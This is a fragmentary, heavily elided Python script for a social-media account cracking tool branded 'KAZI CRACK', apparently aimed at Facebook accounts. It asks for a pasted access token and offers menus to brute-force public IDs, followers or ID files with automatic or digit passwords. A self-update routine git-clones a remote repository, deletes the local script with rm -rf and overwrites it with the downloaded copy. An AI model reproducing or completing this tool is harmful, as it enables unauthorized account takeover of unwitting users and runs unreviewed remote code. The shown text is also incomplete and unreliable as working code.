...
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO KAZI VAU
...
user_agent = ["Mozilla/5.0 (Linux; Android 10; Mi A2 Lite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/kazi3395/kazipro")
			os.system("rm -rf kazipro.py")
			os.system("cp -f kazipro/kazipro.py \\.")
...
def token():
    ...
    try:
        ...
        print("")
        token = raw_input("\033[93;1m PLEASE PASTE TOKEN HERE: \033[92;1m")
...
def menu():
    ...
    print("")
    print("\033[92;1m  [1] KAZI CRACK WITH AUTO PASS")
    print("\033[93;1m  [2] KAZI CRACK WITH DIGIT PASS")
...
def crack1():
	...
	print("")
	print("\033[94;1m  [1] KAZI CRACK PUBLIC ID")
	print("\033[93;1m  [2] KAZI CRACK FOLLOWERS")
	print("\033[92;1m  [3] KAZI CRACK FILE [BEST]")
	print("")
	crack_select1()
...
def crack_select1():
	...
	print("\033[92;1m  BRUTE HAS BEEN STARTED WITH KAZI\x1b[0m")
	print("\033[94;1m  PLEASE WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
